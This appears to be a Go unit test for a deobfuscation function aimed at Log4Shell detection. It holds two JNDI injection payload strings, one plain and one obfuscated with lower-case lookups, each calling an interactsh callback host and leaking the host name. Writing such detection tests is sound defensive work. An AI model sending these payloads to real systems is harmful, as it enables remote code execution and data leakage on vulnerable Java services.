package main

import (
	"testing"
)

func Test_Deobfuscate_1(t *testing.T) {

	input := "${jndi:ldap://${hostName}.xxx.interactsh.com/a}"
	output := deobfuscateLog4J(input)

	input = "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.xxx.interactsh.com/a}"
	if output != deobfuscateLog4J(input) {
		t.FailNow()
	}
}
